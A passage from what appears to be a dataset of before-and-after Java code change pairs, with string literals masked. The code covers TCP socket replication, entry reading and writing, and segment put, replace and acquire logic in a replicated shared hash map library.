                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91408,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91409,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendBootstrap(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(maxEntrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendBootstrap(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}"
91410,"public ServerTcpSocketReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final EntryExternalizable externalizable,int port,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter) throws IOException {
  this.externalizable=externalizable;
  this.map=map;
  this.port=port;
  this.serverChannel=ServerSocketChannel.open();
  this.localIdentifier=map.getIdentifier();
  this.socketChannelEntryWriter=socketChannelEntryWriter;
  this.entrySize=map.maxEntrySize();
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + localIdentifier,true)).execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
      }
    }
  }
);
}","public ServerTcpSocketReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final EntryExternalizable externalizable,int port,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter) throws IOException {
  this.externalizable=externalizable;
  this.map=map;
  this.port=port;
  this.serverChannel=ServerSocketChannel.open();
  this.localIdentifier=map.getIdentifier();
  this.socketChannelEntryWriter=socketChannelEntryWriter;
  this.maxEntrySize=map.maxEntrySize();
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + localIdentifier,true)).execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
      }
    }
  }
);
}"
91411,"/** 
 * reads entries from the socket till it is empty
 * @param socketChannel
 * @throws IOException
 * @throws InterruptedException
 */
void readAll(@NotNull final SocketChannel socketChannel) throws IOException, InterruptedException {
  for (; ; ) {
    if (sizeOfNextEntry == Long.MIN_VALUE) {
      if (bytes.remaining() < 8) {
        socketChannel.read(byteBuffer);
        bytes.limit(byteBuffer.position());
        if (bytes.remaining() < 8)         return;
      }
      sizeOfNextEntry=bytes.readUnsignedShort();
    }
    if (sizeOfNextEntry <= 0)     throw new IllegalStateException(""String_Node_Str"" + sizeOfNextEntry);
    if (bytes.remaining() < sizeOfNextEntry) {
      socketChannel.read(byteBuffer);
      bytes.limit(byteBuffer.position());
      if (bytes.remaining() < sizeOfNextEntry)       return;
    }
    final long limit=bytes.position() + sizeOfNextEntry;
    bytes.limit(limit);
    externalizable.readExternalEntry(bytes);
    bytes.position(limit);
    if (byteBuffer.position() > 0 && byteBuffer.remaining() <= entrySize0) {
      byteBuffer.compact();
      bytes.position(0);
    }
    bytes.limit(byteBuffer.position());
    sizeOfNextEntry=Long.MIN_VALUE;
  }
}","/** 
 * reads entries from the socket till it is empty
 * @param socketChannel
 * @throws IOException
 * @throws InterruptedException
 */
void readAll(@NotNull final SocketChannel socketChannel) throws IOException, InterruptedException {
  for (; ; ) {
    if (sizeOfNextEntry == Long.MIN_VALUE) {
      if (bytes.remaining() < SIZE_OF_UNSIGNED_SHORT) {
        socketChannel.read(byteBuffer);
        bytes.limit(byteBuffer.position());
        if (bytes.remaining() < SIZE_OF_UNSIGNED_SHORT)         return;
      }
      sizeOfNextEntry=bytes.readUnsignedShort();
    }
    if (sizeOfNextEntry <= 0)     throw new IllegalStateException(""String_Node_Str"" + sizeOfNextEntry);
    if (bytes.remaining() < sizeOfNextEntry) {
      socketChannel.read(byteBuffer);
      bytes.limit(byteBuffer.position());
      if (bytes.remaining() < sizeOfNextEntry)       return;
    }
    final long limit=bytes.position() + sizeOfNextEntry;
    bytes.limit(limit);
    externalizable.readExternalEntry(bytes);
    bytes.position(limit);
    if (byteBuffer.position() > 0 && byteBuffer.remaining() <= maxEntrySize + SIZE_OF_UNSIGNED_SHORT) {
      byteBuffer.compact();
      bytes.position(0);
    }
    bytes.limit(byteBuffer.position());
    sizeOfNextEntry=Long.MIN_VALUE;
  }
}"
91412,"public SocketChannelEntryReader(int entrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.entrySize0=entrySize;
  byteBuffer=ByteBuffer.allocate(entrySize0 * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  bytes.limit(0);
  byteBuffer.clear();
}","public SocketChannelEntryReader(int maxEntrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.maxEntrySize=maxEntrySize;
  byteBuffer=ByteBuffer.allocate(this.maxEntrySize * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  bytes.limit(0);
  byteBuffer.clear();
}"
91413,"/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  final long start=bytes.position();
  for (; ; ) {
    if (start != 0)     Log.info(""String_Node_Str"");
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == start)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == start))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.clear();
      bytes.clear();
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
      bytes.limit(bytes.capacity());
      byteBuffer.limit(byteBuffer.capacity());
    }
    return;
  }
}","/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  final long start=bytes.position();
  for (; ; ) {
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == start)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == start))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.clear();
      bytes.clear();
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
      bytes.limit(bytes.capacity());
      byteBuffer.limit(byteBuffer.capacity());
    }
    return;
  }
}"
91414,"public void sendBootstrap(@NotNull final SocketChannel socketChannel,final long timeStampOfLastMessage,final int localIdentifier1) throws IOException {
  bytes.clear();
  byteBuffer.clear();
  bytes.writeByte(localIdentifier1);
  bytes.writeLong(timeStampOfLastMessage);
  byteBuffer.limit((int)bytes.position());
  socketChannel.write(byteBuffer);
  if (byteBuffer.remaining() == 0) {
    byteBuffer.clear();
    bytes.clear();
  }
 else {
    byteBuffer.compact();
    byteBuffer.flip();
    bytes.limit(bytes.capacity());
    byteBuffer.limit(byteBuffer.capacity());
  }
}","public void sendBootstrap(@NotNull final SocketChannel socketChannel,final long timeStampOfLastMessage,final int localIdentifier) throws IOException {
  bytes.clear();
  byteBuffer.clear();
  bytes.writeByte(localIdentifier);
  bytes.writeLong(timeStampOfLastMessage);
  byteBuffer.limit((int)bytes.position());
  socketChannel.write(byteBuffer);
  if (byteBuffer.remaining() == 0) {
    byteBuffer.clear();
    bytes.clear();
  }
 else {
    byteBuffer.compact();
    byteBuffer.flip();
    bytes.limit(bytes.capacity());
    byteBuffer.limit(byteBuffer.capacity());
  }
}"
91415,"@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(1000);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.remove(3);
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91416,"/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize;
}","/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize * 2;
}"
91417,"/** 
 * called from a remote node as part of replication
 * @param keyBytes
 * @param value
 * @param hash2
 * @param identifier
 * @param timestamp
 * @param valueLen
 * @param entrySize1
 * @return
 */
private void replicatingPut(Bytes keyBytes,Bytes value,int hash2,final byte identifier,final long timestamp,final long valueLen,final long entrySize1){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveAndDeleted.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      boolean wasDeleted;
      final long timeStampPos=entry.positionAddr();
      if (shouldTerminate(entry,timestamp,identifier))       return;
      wasDeleted=entry.readBoolean();
      entry.positionAddr(timeStampPos);
      entry.writeLong(timestamp);
      entry.writeByte(identifier);
      entry.writeBoolean(false);
{
        long valueLenPos=entry.position();
        long entryEndAddr=entry.positionAddr() + valueLen;
        putValue(pos,offset,entry,valueLenPos,entryEndAddr,value);
      }
      if (wasDeleted) {
        hashLookupLiveOnly.put(hash2,pos);
        incrementSize();
      }
      return;
    }
    pos=alloc(inBlocks(entrySize1));
    long offset=offsetFromPos(pos);
    clearMetaData(offset);
    NativeBytes entry=entry(offset);
    entry.writeStopBit(keyLen);
    entry.write(keyBytes);
    entry.writeLong(timestamp);
    entry.writeByte(identifier);
    entry.writeBoolean(false);
    entry.writeStopBit(valueLen);
    alignment.alignPositionAddr(entry);
    entry.write(value);
    hashLookupLiveAndDeleted.putAfterFailedSearch(pos);
    hashLookupLiveOnly.put(hash2,pos);
    incrementSize();
  }
  finally {
    unlock();
  }
}","/** 
 * called from a remote node as part of replication
 * @param keyBytes
 * @param valueBytes
 * @param hash2
 * @param identifier
 * @param timestamp
 * @return
 */
private void replicatingPut(Bytes keyBytes,Bytes valueBytes,int hash2,final byte identifier,final long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveAndDeleted.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      final long timeStampPos=entry.positionAddr();
      if (shouldTerminate(entry,timestamp,identifier))       return;
      boolean wasDeleted=entry.readBoolean();
      entry.positionAddr(timeStampPos);
      entry.writeLong(timestamp);
      entry.writeByte(identifier);
      entry.writeBoolean(false);
      long valueLenPos=entry.position();
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      putValue(pos,offset,entry,valueLenPos,entryEndAddr,valueBytes);
      if (wasDeleted) {
        hashLookupLiveOnly.put(hash2,pos);
        incrementSize();
      }
      return;
    }
    long valueLen=valueBytes.remaining();
    int pos=alloc(inBlocks(entrySize(keyLen,valueLen)));
    long offset=offsetFromPos(pos);
    clearMetaData(offset);
    NativeBytes entry=entry(offset);
    entry.writeStopBit(keyLen);
    entry.write(keyBytes);
    entry.writeLong(timestamp);
    entry.writeByte(identifier);
    entry.writeBoolean(false);
    entry.writeStopBit(valueLen);
    alignment.alignPositionAddr(entry);
    entry.write(valueBytes);
    hashLookupLiveAndDeleted.putAfterFailedSearch(pos);
    hashLookupLiveOnly.put(hash2,pos);
    incrementSize();
  }
  finally {
    unlock();
  }
}"
91418,"/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2,long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveOnly.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (canReplicate && shouldTerminate(entry,timestamp,localIdentifier)) {
        return null;
      }
      entry.skip(1);
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry);
    }
    return null;
  }
  finally {
    unlock();
  }
}","/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2,long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveOnly.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (canReplicate) {
        if (shouldTerminate(entry,timestamp,localIdentifier))         return null;
        entry.skip(1);
      }
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry);
    }
    return null;
  }
  finally {
    unlock();
  }
}"
91419,"/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#acquire(net.openhft.lang.io.Bytes,Object,Object,int,boolean)
 */
V acquire(Bytes keyBytes,K key,V usingValue,int hash2,boolean create,long timestamp){
  lock();
  try {
    MultiStoreBytes entry=tmpBytes;
    long offset=searchKey(keyBytes,hash2,entry,hashLookupLiveOnly);
    if (offset >= 0) {
      if (canReplicate && shouldTerminate(entry,timestamp,localIdentifier))       return null;
      entry.skip(1);
      return onKeyPresentOnAcquire(key,usingValue,offset,entry);
    }
 else {
      usingValue=tryObtainUsingValueOnAcquire(keyBytes,key,usingValue,create);
      if (usingValue != null) {
        offset=putEntryConsideringByteableValue(keyBytes,hash2,usingValue);
        incrementSize();
        notifyPut(offset,true,key,usingValue,posFromOffset(offset));
        return usingValue;
      }
 else {
        return null;
      }
    }
  }
  finally {
    unlock();
  }
}","/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#acquire(net.openhft.lang.io.Bytes,Object,Object,int,boolean)
 */
V acquire(Bytes keyBytes,K key,V usingValue,int hash2,boolean create,long timestamp){
  lock();
  try {
    MultiStoreBytes entry=tmpBytes;
    long offset=searchKey(keyBytes,hash2,entry,hashLookupLiveOnly);
    if (offset >= 0) {
      if (canReplicate) {
        if (shouldTerminate(entry,timestamp,localIdentifier))         return null;
        entry.skip(1);
      }
      return onKeyPresentOnAcquire(key,usingValue,offset,entry);
    }
 else {
      usingValue=tryObtainUsingValueOnAcquire(keyBytes,key,usingValue,create);
      if (usingValue != null) {
        offset=putEntryConsideringByteableValue(keyBytes,hash2,usingValue);
        incrementSize();
        notifyPut(offset,true,key,usingValue,posFromOffset(offset));
        return usingValue;
      }
 else {
        return null;
      }
    }
  }
  finally {
    unlock();
  }
}"
91420,"V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent,final byte identifier,final long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveAndDeleted.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        boolean wasDeleted=false;
        if (canReplicate) {
          final long timeStampPos=entry.positionAddr();
          if (shouldTerminate(entry,timestamp,identifier))           return null;
          wasDeleted=entry.readBoolean();
          entry.positionAddr(timeStampPos);
          entry.writeLong(timestamp);
          entry.writeByte(identifier);
          entry.writeBoolean(false);
        }
        final V result=replaceValueOnPut(key,value,entry,pos,offset);
        if (wasDeleted) {
          hashLookupLiveOnly.put(hash2,pos);
          incrementSize();
          return null;
        }
 else {
          return result;
        }
      }
 else {
        if (!canReplicate)         return putReturnsNull ? null : readValue(entry,null);
        if (shouldTerminate(entry,timestamp,identifier))         return null;
        final boolean wasDeleted=entry.readBoolean();
        if (wasDeleted) {
          hashLookupLiveOnly.put(hash2,pos);
          incrementSize();
          return null;
        }
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,hash2,value,identifier);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}","V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent,final byte identifier,final long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    int pos;
    while ((pos=hashLookupLiveAndDeleted.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        boolean wasDeleted=false;
        if (canReplicate) {
          final long timeStampPos=entry.positionAddr();
          if (shouldTerminate(entry,timestamp,identifier))           return null;
          wasDeleted=entry.readBoolean();
          entry.positionAddr(timeStampPos);
          entry.writeLong(timestamp);
          entry.writeByte(identifier);
          entry.writeBoolean(false);
        }
        final V result=replaceValueOnPut(key,value,entry,pos,offset);
        if (wasDeleted) {
          hashLookupLiveOnly.put(hash2,pos);
          incrementSize();
          return null;
        }
 else {
          return result;
        }
      }
 else {
        if (canReplicate) {
          if (shouldTerminate(entry,timestamp,identifier))           return null;
          final boolean wasDeleted=entry.readBoolean();
          if (wasDeleted) {
            hashLookupLiveOnly.put(hash2,pos);
            incrementSize();
            return null;
          }
        }
